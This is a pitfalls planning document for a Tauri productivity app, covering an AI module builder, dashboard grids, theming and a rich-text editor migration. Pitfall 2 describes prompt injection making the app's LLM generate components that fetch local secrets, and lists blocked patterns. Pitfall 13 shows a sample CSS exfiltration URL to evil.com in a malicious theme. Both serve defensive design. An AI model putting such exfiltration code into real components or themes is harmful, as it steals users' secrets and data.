# Domain Pitfalls

**Domain:** All-in-one life productivity desktop app with AI module builder, dashboard grids, theming, and rich text editing
**Researched:** 2026-03-19

---

## Critical Pitfalls

Mistakes that cause rewrites, security breaches, or architectural dead ends.

---

### Pitfall 1: AI Module Builder Blocked by CSP — Dynamic Code Execution is Forbidden

**What goes wrong:** The obvious approach to AI-generated React components is: LLM generates JSX string, transpile at runtime with Babel standalone, execute via dynamic code evaluation. This is dead on arrival. The app's CSP explicitly sets `script-src 'self'` with no `unsafe-eval` exception, and CLAUDE.md mandates that CSP blocks dynamic code evaluation constructs. Relaxing this CSP is not an option -- it is a critical security boundary that protects against XSS in a desktop app with access to the OS keychain and Tailscale-networked services.

**Why it happens:** Teams prototype the AI code execution path in a dev environment where CSP is relaxed or not enforced, get it working, then discover it fails in production Tauri builds. Or they add `unsafe-eval` to CSP "temporarily" and never remove it, creating a gaping XSS attack surface.

**Consequences:** Either the module builder is fundamentally broken in production, or the app's 96/100 security score drops to near zero. An XSS exploit in a Tauri app with keychain access, Tailscale credentials, and SSRF proxy capabilities would be catastrophic.

**Prevention:**
1. **Pre-compile on the server (OpenClaw VM).** Bjorn generates JSX on the OpenClaw VM. A build service (Vite/esbuild) on the VM transpiles it to a self-contained ES module. The Tauri app fetches the compiled `.js` bundle via the Axum proxy.
2. **Load compiled modules via dynamic `import()`.** ESM dynamic imports work under `script-src 'self'` if served from the same origin (localhost:3000 via Axum). No runtime code evaluation needed.
3. **Render in a sandboxed iframe** with `sandbox="allow-scripts"` and a separate CSP. The iframe gets its own origin isolation. Communicate via `postMessage`. This aligns with Tauri's own Isolation Pattern.
4. **Never add `unsafe-eval` to CSP.** Treat this as an invariant, not a tradeoff.

**Detection:** CI test that parses `tauri.conf.json` and fails if `unsafe-eval` appears in any CSP directive. Pre-commit hook that greps for dynamic code evaluation patterns in frontend source files.

**Phase:** AI Module Builder (must be solved in architecture phase, not implementation)

---

### Pitfall 2: AI-Generated Code Escapes Sandbox — Prompt Injection to RCE

**What goes wrong:** The AI generates a React component that appears benign but contains `fetch('http://127.0.0.1:3000/api/secrets')` or accesses `window.parent` to escape the iframe sandbox. Because the Axum server runs on localhost and trusts localhost origins in debug mode, a sandboxed component could exfiltrate keychain secrets, send messages via BlueBubbles, or modify Supabase data.

**Why it happens:** LLMs are susceptible to prompt injection. A user (or data fed to the LLM) could craft prompts that cause Bjorn to generate components with embedded data exfiltration, DOM manipulation, or API calls to the local Axum server. The OWASP Top 10 for LLMs lists this as the #1 risk (LLM01:2025 Prompt Injection).

**Consequences:** Full compromise of user data. The AI module builder becomes an attack vector into every service the app connects to (iMessage, Supabase, CouchDB, Tailscale-networked VMs).

**Prevention:**
1. **Sandboxed iframe with null origin.** Use `sandbox="allow-scripts"` WITHOUT `allow-same-origin`. This gives the iframe a unique opaque origin that cannot access the parent's cookies, localStorage, or make same-origin requests to localhost:3000.
2. **Static analysis gate before execution.** After Bjorn generates code, run a validator (AST analysis) that rejects: `fetch()`, `XMLHttpRequest`, `WebSocket`, `import()` of external URLs, `document.cookie`, `window.parent`, `window.top`, `postMessage` to non-approved targets. Use a small secondary LLM as a code reviewer (NVIDIA's recommended pattern).
3. **Allowlisted primitives only.** AI modules can only import from a pre-approved set of component primitives (charts, lists, forms) that are bundled into the sandbox. No arbitrary npm imports.
4. **Network egress blocked.** The sandbox iframe's CSP should be `connect-src 'none'; img-src 'none'` -- no network access whatsoever. Data flows in via `postMessage` from the parent.
5. **User approval flow.** Generated code is shown for review before execution. Never auto-execute AI-generated code.

**Detection:** Automated test suite that attempts common sandbox escapes (accessing parent, fetching localhost, importing external scripts) and verifies they fail. Penetration test of the module builder as part of the security review.

**Phase:** AI Module Builder (security architecture, before any code execution is implemented)

---

### Pitfall 3: Notes Editor Migration Destroys Existing Data — CodeMirror to Rich Text

**What goes wrong:** The current notes editor uses CodeMirror 6 with raw Markdown editing (verified: `NoteEditor.tsx` imports `@codemirror/view`, `@codemirror/lang-markdown`, etc.). Switching to a WYSIWYG rich text editor (Tiptap/ProseMirror) requires converting the internal document format. Existing notes stored in CouchDB as Obsidian LiveSync format (plain Markdown with `[[wiki-links]]` and `![[image embeds]]`) must be parseable by the new editor. The NoteEditor already has a custom `ImageWidget` class that recognizes `![[image.png]]` syntax -- this Obsidian-specific parsing must be replicated in any new editor.

**Why it happens:** Developers build the new editor, test it on fresh notes, and forget that the CouchDB vault has existing notes in raw Markdown format with Obsidian-specific syntax (`![[image.png]]`, `[[Page Name|display text]]`, callout blocks `> [!warning]`, frontmatter YAML). Tiptap's Markdown extension handles standard CommonMark but not Obsidian extensions.

**Consequences:** Users open the new editor and their notes are garbled: wiki-links rendered as literal text, images missing, callouts flattened, frontmatter displayed as body text. Worse, if the editor re-saves the corrupted parse, the original Markdown in CouchDB is permanently damaged. This is data loss in an app that explicitly requires soft deletes and no data destruction.

**Prevention:**
1. **Keep CodeMirror as the source-of-truth mode.** The raw Markdown editor must remain available as a fallback. Never force users into WYSIWYG-only.
2. **Custom Tiptap extensions for Obsidian syntax.** Build extensions for `[[wiki-links]]`, `![[image embeds]]`, callout blocks, and frontmatter before migrating. Do not ship WYSIWYG without these.
3. **Round-trip fidelity tests.** For every note format: parse Markdown to Tiptap JSON, serialize back to Markdown, diff. If any content is lost or changed, the migration is not ready.
4. **Read-only WYSIWYG preview first.** Ship a Markdown preview/render mode before full WYSIWYG editing. This surfaces parsing issues without risking data corruption.
5. **Never auto-convert on save.** The storage format stays as Markdown in CouchDB. Tiptap loads by parsing Markdown, edits produce Tiptap JSON internally, saves serialize back to Markdown. The CouchDB document format never changes.

**Detection:** Automated test that loads note fixtures (with wiki-links, images, callouts, frontmatter, tables, code blocks) through the Tiptap parser and back, asserting byte-identical Markdown output. Run this test on a snapshot of real vault data.

**Phase:** Notes Overhaul (must be the very first task in that phase)

---

### Pitfall 4: Dashboard Grid State Becomes Desynchronized Across Devices

**What goes wrong:** Dashboard widget layouts are stored in localStorage for fast load. But the app also syncs preferences to Supabase for multi-device use (via `preferences-sync.ts`). When a user rearranges widgets on their desktop, then opens the app on another machine, the layout either doesn't sync (localStorage wins), creates a merge conflict (different layouts on different screen sizes), or thrashes between remote and local state on every sync cycle.

**Why it happens:** The existing codebase already has this problem. `sidebar-settings.ts` uses `useSyncExternalStore` + localStorage + Supabase sync, and CONCERNS.md explicitly flags a "Race Condition Risk" with "Simultaneous local+remote writes can cause data loss." Dashboard grid layouts are more complex because they are resolution-dependent -- a layout designed for a 1440p monitor makes no sense on a 1080p laptop. `react-grid-layout` uses responsive breakpoints (`lg: 1200, md: 996, sm: 768`) that produce different layout objects per breakpoint. Syncing "the layout" without breakpoint context merges incompatible data.

**Consequences:** Widget positions jump randomly after sync. Widgets pile up in the top-left corner (the default react-grid-layout behavior when layout data is invalid -- documented in issues #902 and #1583). Users lose their carefully arranged dashboards.

**Prevention:**
1. **Sync layouts per breakpoint, not as a single object.** Store `{ lg: [...], md: [...], sm: [...] }` in Supabase, not a flat layout array. Each device applies the layout for its current breakpoint.
2. **Last-write-wins with timestamp.** Each layout update carries a timestamp. On conflict, the most recent edit wins. This is simple and works for a single-user app.
3. **Load layout AFTER items are mounted.** The known react-grid-layout issue: if the layout is applied before widget components exist, items stack in the top-left. Load layout from localStorage/Supabase only after dashboard widgets have rendered at least once.
4. **Default layout as fallback.** If stored layout references widgets that no longer exist (module disabled, widget removed), fall back to auto-generated layout rather than rendering a broken grid.

**Detection:** Test that saves a layout, changes breakpoint (resize window), verifies independent layout per breakpoint, then simulates Supabase sync and confirms no data loss.

**Phase:** Dashboard Grid (layout persistence design must come before drag/drop implementation)

---

### Pitfall 5: Theming System Breaks Existing Hardcoded Styles

**What goes wrong:** The app currently has 100+ CSS custom properties in `globals.css`, but also has extensive inline styles throughout components. AgentStatusCard uses `var(--text-secondary)` (good), but `dashboard/types.ts` returns hardcoded values like `background: 'rgba(52, 211, 153, 0.2)'` and `color: 'var(--green-bright)'` mixed with `border: '1px solid rgba(52, 211, 153, 0.25)'`. A theming system that changes CSS variables will only affect `var()` references -- hardcoded color values in JSX `style` props and in TypeScript utility functions are invisible to theme changes. The result: 60% of the UI follows the new theme, 40% stays frozen in the original dark theme.

**Why it happens:** The app grew organically. Early components use inline hex colors. Later components use CSS variables. Status pill utilities (`missionStatusStyle`, `effortColor`, `pillStyle` in `dashboard/types.ts`) return raw `rgba()` strings mixed with `var()` references. The theming system sees CSS variables but has no visibility into JavaScript-generated style objects.

**Consequences:** Switching to a light theme or custom accent color produces a visual mess: some cards respond, some don't. Status indicators, badges, and chart colors remain hardcoded. Users perceive the theming as broken.

**Prevention:**
1. **Audit and migrate ALL hardcoded colors to CSS variables BEFORE building the theme editor.** This is the prerequisite. Grep for `#[0-9a-fA-F]`, `rgba(`, `rgb(` in all `.tsx` and `.ts` files. Each instance must use a CSS variable.
2. **Convert style utility functions to use CSS variables.** `missionStatusStyle()` should return `var(--status-done-bg)` not `rgba(52, 211, 153, 0.2)`. Create semantic status variables that the theme system controls.
3. **Lint rule to prevent new hardcoded colors.** Add a custom ESLint rule (or stylelint rule) that flags raw color values in JSX `style` props and CSS files.
4. **Test both themes in CI.** Render every page in light and dark mode, screenshot, diff against baselines. Flag components where theme variables have no effect (indicating hardcoded colors).

**Detection:** Grep for raw color values in source files -- the count of hardcoded colors should trend toward zero before the theme editor ships.

**Phase:** Visual Consistency Overhaul (must happen BEFORE theming system)

---

## Moderate Pitfalls

---

### Pitfall 6: Dashboard Drag/Drop Causes Re-render Avalanche

**What goes wrong:** Each widget in `react-grid-layout` re-renders on every pixel of drag movement because the layout object changes on every `onLayoutChange` callback. With 8-10 widgets containing live-updating data (the existing dashboard polls on 10s/30s intervals via `useDashboardData` with `fastTick` and `slowTick`), each drag gesture triggers hundreds of re-renders across all widgets simultaneously. On lower-powered machines this produces visible jank -- the resize handle lags 2-3x behind the cursor (a documented react-resizable issue #237).

**Prevention:**
1. **Wrap every widget in `React.memo` with a custom comparator.** The existing codebase already uses `React.memo` on dashboard cards (AgentStatusCard, etc.) -- but the memo must compare widget-specific props, not layout position props that change every frame.
2. **Separate layout state from content state.** The grid container owns layout positions. Widgets receive their content data independently. Use React context or separate React Query subscriptions so widget content doesn't re-fetch during drag.
3. **Pause data polling during drag.** Set an `isDragging` ref that pauses the `fastTick`/`slowTick` intervals while the user is actively moving widgets. Resume on drag end.
4. **Use `useDeferredValue` for layout updates.** React 18's concurrent features can deprioritize layout recalculations during rapid drag movements.

**Phase:** Dashboard Grid (performance optimization, after basic drag/drop works)

---

### Pitfall 7: Wiki-Link Resolution Creates O(n^2) Parsing on Every Keystroke

**What goes wrong:** `[[wiki-links]]` need to resolve to actual note titles for autocomplete suggestions and backlink computation. A naive implementation parses every note's content on every keystroke to find matching links, creating O(notes * content_length) work. With 500+ notes, this makes the editor laggy.

**Prevention:**
1. **Build a link index on note load, not on keystroke.** When the vault loads from CouchDB, extract all `[[...]]` references and build a `Map<targetId, Set<sourceId>>` for backlinks. Update incrementally when a note is saved.
2. **Debounce link resolution.** Autocomplete suggestions for `[[` can be debounced (200ms). The backlink index updates on save, not on type.
3. **Store extracted links in note metadata.** The existing `VaultNote.links: string[]` field already stores extracted links -- use this for the backlink graph instead of re-parsing content.

**Phase:** Notes Overhaul (architecture decision for link resolution)

---

### Pitfall 8: Tiptap Bundle Size Explosion

**What goes wrong:** Tiptap is modular -- each extension is a separate package. A full-featured editor (bold, italic, headings, lists, code blocks, tables, images, task lists, links, mentions, callouts, wiki-links) easily adds 15+ extensions. Each pulls in ProseMirror dependencies. Total bundle impact can be 200-400KB gzipped. The existing NoteEditor with CodeMirror 6 already imports multiple CodeMirror packages (`@codemirror/view`, `@codemirror/state`, `@codemirror/commands`, `@codemirror/lang-markdown`, `@codemirror/language`, `@codemirror/language-data`, `@codemirror/search`, `@codemirror/autocomplete`, `@lezer/highlight`). Adding Tiptap on top means two full editor stacks in the bundle.

**Prevention:**
1. **Lazy-load the editor.** The notes page is already lazy-loaded. Ensure Tiptap and all extensions are code-split into a separate chunk that loads only when the user opens Notes.
2. **Import only what you use.** Avoid the Tiptap "starter kit" bundle which includes everything. Import individual extensions.
3. **Remove CodeMirror if Tiptap replaces it, or split by editor mode.** If both editors coexist (raw Markdown vs WYSIWYG), code-split them into separate chunks so only one loads at a time based on the user's editor preference.
4. **Measure before and after.** Run `npx vite-bundle-visualizer` before and after Tiptap integration. Set a budget: the notes chunk should not exceed 500KB gzipped.

**Phase:** Notes Overhaul (implementation, validated with bundle analysis)

---

### Pitfall 9: Theme Variable Explosion Makes Presets Unmaintainable

**What goes wrong:** The app already defines 100+ CSS custom properties. Counting from `globals.css`: ~25 base colors, ~30 alpha-tint variants (`--purple-a08` through `--accent-a40`, `--red-a08` through `--red-500-a25`, `--green-400-a12` through `--emerald-a15`, `--gold-a12` through `--gold-a25`), ~8 surface layers, ~5 border variants, ~5 text colors, ~10 motion/timing values, ~6 z-index levels, ~5 radius values, plus light theme overrides. A "theme preset" that overrides all of these is a 100+ line JSON object. Creating 5 presets means maintaining 500+ color values. Users creating custom themes in the CSS variable editor face a wall of 100+ sliders.

**Prevention:**
1. **Two-tier variable architecture.** Primitive variables (`--purple-500: #a78bfa`) are fixed. Semantic variables (`--accent: var(--purple-500)`) are theme-controlled. Presets only override the 15-20 semantic variables, not the 100+ primitives.
2. **Derive alpha variants programmatically.** Instead of storing `--accent-a10`, `--accent-a15`, `--accent-a30` as separate variables, compute them from a base color using `color-mix()` with alpha. Modern CSS: `color-mix(in oklch, var(--accent), transparent 85%)` replaces `--accent-a15`. This cuts the variable count by 60%.
3. **Theme editor shows categories, not a flat list.** Group variables: "Accent Color" (1 picker), "Surface" (3 pickers: base, card, elevated), "Text" (3 pickers), "Status Colors" (4 pickers). Total: ~12 controls, not 100.
4. **Preset = accent color + mode.** The simplest viable preset is just `{ accent: '#a78bfa', mode: 'dark' }` with everything else derived. Ship this first, add granular control later.

**Phase:** Theming System (design phase, before implementing the editor UI)

---

### Pitfall 10: Responsive Layout Breaks Because Content Area Width Is Ignored

**What goes wrong:** The Tauri window has `minWidth: 900` (per `tauri.conf.json`) but the sidebar is resizable. At 900px with the sidebar at its default width (~280px), the main content area is only ~620px. Dashboard grid breakpoints (`lg: 1200, md: 996, sm: 768`) never reach `lg` for the content area (only for the full window). Widgets meant for 3-column layout render in 2-column or single-column layout, looking cramped. On a 1080p monitor with sidebar open, the dashboard is always in "tablet" mode.

**Prevention:**
1. **Measure content area width, not window width.** `react-grid-layout`'s `WidthProvider` measures the container element, not `window.innerWidth`. This is correct -- but ensure the container has `width: 100%` and the sidebar does not cause layout reflow on resize.
2. **Define breakpoints relative to the content area.** Dashboard breakpoints should be: `lg: 900, md: 600, sm: 400` (content-area pixels, not window pixels). This ensures 3-column layout at reasonable sidebar widths.
3. **Test at multiple resolutions with sidebar open and collapsed.** Hardcode test scenarios: `1920x1080 - 280px sidebar = 1640px content`, `1366x768 - 280px sidebar = 1086px content`, `900x600 - 280px sidebar = 620px content`. Verify grid responds correctly at each.
4. **Debounce sidebar resize events.** The sidebar is draggable to resize (`ResizablePanel.tsx`). Each pixel of sidebar drag changes the dashboard container width, which triggers grid relayout. Debounce this to 100ms.

**Phase:** Dashboard Grid + Responsive Layout (cross-cutting concern)

---

### Pitfall 11: AI Module Hot-Reload Leaks Memory and Event Listeners

**What goes wrong:** A user generates module v1, views it, generates v2, views it, repeats 20 times. Each iteration loads a new component instance. If the sandbox iframe is not fully destroyed and recreated, or if the component registers event listeners, timers, or subscriptions without cleanup, memory grows linearly. After 20 iterations, the app is using 2GB of RAM and the Tauri process becomes sluggish. This echoes the existing Object URL leak concern flagged in CONCERNS.md for `useMessageCompose`.

**Prevention:**
1. **Full iframe teardown between reloads.** Remove the iframe element from the DOM entirely and create a new one. Do not reuse the iframe and swap its `srcdoc`. This guarantees the old JavaScript context is garbage collected.
2. **Track and enforce cleanup.** The module primitive API should require a `cleanup()` function. If a module registers a timer, it must clear it in cleanup. The sandbox framework calls cleanup before teardown.
3. **Memory budget per module.** Use `performance.measureUserAgentSpecificMemory()` (Chromium WebView) or track iframe heap size. Warn when a module exceeds 50MB.
4. **Limit iteration count.** Cap at 10 active module previews. Beyond that, require saving or discarding before generating more.

**Phase:** AI Module Builder (implementation, after sandbox architecture is settled)

---

### Pitfall 12: CouchDB LiveSync Conflict Resolution Corrupts Notes During WYSIWYG Editing

**What goes wrong:** Obsidian LiveSync uses CouchDB's conflict resolution. If the user edits a note in the Tiptap WYSIWYG editor while Obsidian on another device edits the same note, CouchDB creates a conflict document. The app picks one revision as the winner, but the losing revision's changes are silently discarded. In a rich text editor, "silent discard" means paragraphs or formatting vanish without warning. The current `vault.ts` implementation uses `hasFetchedFromBackend` flags to handle caching -- a fix for a previous content caching bug noted in CONCERNS.md -- but does not handle CouchDB conflicts.

**Prevention:**
1. **Show conflict indicator.** When CouchDB returns a conflicted document (multiple `_rev` values), surface this in the editor UI with a "Conflict detected -- review changes" banner.
2. **Three-way merge for text content.** Store the common ancestor `_rev`, diff both branches against it, and present a merge UI for text content. This is complex but prevents silent data loss.
3. **Lock-on-edit pattern.** When the WYSIWYG editor opens a note, write a lightweight "editing lock" to the note's metadata. Other devices see "Note is being edited on another device" and defer sync. Release on save/close.
4. **Keep the last N revisions accessible.** Store previous versions (CouchDB naturally keeps conflicts) and surface a "Version History" panel. This aligns with the project's "soft delete / no data destruction" principle.

**Phase:** Notes Overhaul (must be designed before real-time sync features are built)

---

## Minor Pitfalls

---

### Pitfall 13: Theme Import/Export Enables Code Injection via Malicious CSS

**What goes wrong:** Community theme sharing allows importing a JSON/CSS file that overrides CSS variables. A malicious theme could include CSS that hides UI elements (`display: none` on the logout button), creates fake overlays, or exfiltrates data via `background-image: url('https://evil.com/steal?data=...')`.

**Prevention:**
1. **Validate theme files.** Only allow CSS custom property overrides matching a whitelist of variable names. Reject any theme that contains `url()`, `@import`, `expression()`, or references to external resources.
2. **Sanitize on import.** Parse the theme JSON, extract only recognized property names, rebuild the CSS from sanitized values. Never inject raw user-provided CSS strings.
3. **CSP protects against the worst case.** The existing `img-src 'self' data: http://127.0.0.1:3000` CSP blocks external image URLs, but verify this also applies to `background-image` in user-injected CSS.

**Phase:** Theming System (theme import/export feature)

---

### Pitfall 14: Dashboard "Add Widget" Menu Exposes AI Modules Before Approval

**What goes wrong:** If the widget picker shows AI-generated modules alongside built-in widgets without distinguishing them, users might add an unapproved AI module to their live dashboard. This bypasses the approval flow (preview -> review -> approve -> install).

**Prevention:**
1. **Separate sections in the widget picker.** "Built-in Widgets" (always safe) vs "AI Modules" (with approval status badges: draft/approved/rejected).
2. **Only approved modules appear in the widget picker.** Draft/pending modules are only accessible from the AI Module Builder's preview panel.
3. **Approval persists in Supabase.** Module approval status is stored server-side, not in localStorage. A module cannot be "approved" by modifying client-side state.

**Phase:** AI Module Builder + Dashboard Grid (integration point)

---

### Pitfall 15: `worker-src 'none'` Blocks Web Workers for Heavy Computation

**What goes wrong:** The CSP in `tauri.conf.json` sets `worker-src 'none'`, which prevents creating Web Workers. If the rich text editor, graph view (already lazy-loaded as `GraphView` in the notes page), or AI module sandbox needs off-main-thread computation (Markdown parsing, force-directed graph layout, CRDT merge operations), Web Workers are blocked. This forces all heavy computation onto the main thread, causing UI jank.

**Prevention:**
1. **Consider relaxing to `worker-src 'self'`.** This allows same-origin workers without security risk (no external scripts can run as workers).
2. **Use Rust-side computation for heavy tasks.** Graph layout, CRDT merges, and Markdown parsing can be done in the Axum backend (Rust is significantly faster anyway). Send results to the frontend via API calls.
3. **If workers stay blocked, use `requestIdleCallback` for chunked computation.** Break heavy tasks into 16ms chunks on the main thread using idle callbacks to avoid blocking user input.

**Phase:** Notes Overhaul and Dashboard Grid (affects graph view and potentially grid layout calculations)

---

### Pitfall 16: Building the AI Module Builder Before Primitives Exist

**What goes wrong:** Rushing to the "wow" feature (Bjorn module builder) before the design system, component primitives, and dashboard grid are stable. AI-generated modules compose from primitives -- if primitives are buggy or visually inconsistent, every generated module inherits those problems. Bjorn generates a chart widget, but the chart primitive has a z-index bug that causes it to render behind the grid overlay.

**Prevention:**
1. **Enforce the dependency chain:** visual polish -> dashboard grid -> module primitives -> Bjorn builder. Primitives must have comprehensive tests and visual regression coverage before Bjorn consumes them.
2. **Define the primitive API contract first.** Document the props, events, and styling interface that each primitive exposes. Bjorn's prompt template references this contract. The contract is stable even if the implementation changes.
3. **Ship primitives as standalone testable components.** Each primitive (chart, list, form, stat card, table) should have its own Storybook-style test page and be usable without the AI builder.

**Detection:** If generated modules require manual tweaking to look right, the primitives are not ready.

**Phase:** Dashboard Grid must ship before AI Module Builder

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| AI Module Builder | CSP blocks dynamic code execution (#1) | Pre-compile on OpenClaw VM, load via dynamic import or sandboxed iframe |
| AI Module Builder | Prompt injection to RCE (#2) | Null-origin iframe sandbox, static analysis gate, allowlisted primitives only |
| AI Module Builder | Memory leak on hot-reload (#11) | Full iframe teardown, cleanup contract, memory budget |
| AI Module Builder | Unapproved modules in widget picker (#14) | Separate widget picker sections, server-side approval status |
| AI Module Builder | Building before primitives exist (#16) | Enforce dependency chain, ship primitives first |
| Dashboard Grid | State desync across devices (#4) | Per-breakpoint sync, timestamp-based conflict resolution |
| Dashboard Grid | Re-render avalanche during drag (#6) | React.memo, separated layout/content state, paused polling |
| Dashboard Grid | Responsive breakpoints miscalculated (#10) | Measure content area not window, adjust breakpoints for sidebar |
| Notes Overhaul | Data loss on editor migration (#3) | Keep CodeMirror fallback, round-trip fidelity tests, never change storage format |
| Notes Overhaul | Wiki-link O(n^2) parsing (#7) | Pre-built link index, debounced resolution, metadata-stored links |
| Notes Overhaul | Tiptap bundle bloat (#8) | Lazy-load, individual extension imports, bundle budget |
| Notes Overhaul | CouchDB conflict during editing (#12) | Conflict indicator, lock-on-edit, version history |
| Notes Overhaul | Worker-src blocks graph computation (#15) | Relax to `worker-src 'self'` or compute in Rust |
| Theming System | Hardcoded colors resist theming (#5) | Audit + migrate colors BEFORE building theme editor |
| Theming System | Variable explosion (#9) | Two-tier architecture, derive alpha variants, minimal presets |
| Theming System | Malicious imported themes (#13) | Whitelist variable names, sanitize on import, CSP backstop |
| Visual Polish | Must precede theming (#5) | Color audit and variable migration is a prerequisite phase |

---

## Sources

- [OWASP LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- [NVIDIA: Practical Security for Sandboxing Agentic Workflows](https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/)
- [NVIDIA: Code Execution Risks in Agentic AI](https://developer.nvidia.com/blog/how-code-execution-drives-key-risks-in-agentic-ai-systems/)
- [Bluebag: Sandboxed Code Execution Security](https://www.bluebag.ai/blog/sandboxed-code-execution-security)
- [LLM Output Sanitization: Preventing Code Injection](https://www.securebydezign.com/articles/llm-output-sanitization-preventing-code-injection.html)
- [Tauri v2 CSP Documentation](https://v2.tauri.app/security/csp/)
- [Tauri v2 Isolation Pattern](https://v2.tauri.app/concept/inter-process-communication/isolation/)
- [react-grid-layout Issue #902: Layouts reset on reload](https://github.com/STRML/react-grid-layout/issues/902)
- [react-grid-layout Issue #1583: onLayoutChange resets localStorage data](https://github.com/react-grid-layout/react-grid-layout/issues/1583)
- [react-resizable Issue #237: Resize handle lagging behind cursor](https://github.com/react-grid-layout/react-resizable/issues/237)
- [Liveblocks: Which Rich Text Editor in 2025](https://liveblocks.io/blog/which-rich-text-editor-framework-should-you-choose-in-2025)
- [Tiptap Markdown Extension Documentation](https://tiptap.dev/docs/editor/markdown)
- [CSS Variables Pitfalls](https://blog.pixelfreestudio.com/css-variables-gone-wrong-pitfalls-to-watch-out-for/)
- [CSS Variables Guide: Design Tokens and Theming](https://www.frontendtools.tech/blog/css-variables-guide-design-tokens-theming-2025)
- [awesome-sandbox: Code Sandboxing for AI](https://github.com/restyler/awesome-sandbox)
- [CVE-2025-55182: React Server Components RCE](https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/)
- Existing codebase analysis: `tauri.conf.json` CSP configuration, `globals.css` 100+ variable inventory, `dashboard/types.ts` hardcoded color functions, `vault.ts` CouchDB integration and caching, `NoteEditor.tsx` CodeMirror 6 implementation with Obsidian image embed support, `CONCERNS.md` known race conditions and tech debt

---

*Pitfalls researched: 2026-03-19. Overall confidence: HIGH for pitfalls #1-5 (verified against actual codebase files + official security docs + library issue trackers). MEDIUM for #6-12 (based on documented library issues + architectural analysis of existing code patterns). LOW for #13-16 (extrapolated from security patterns and dependency ordering, needs validation during implementation).*
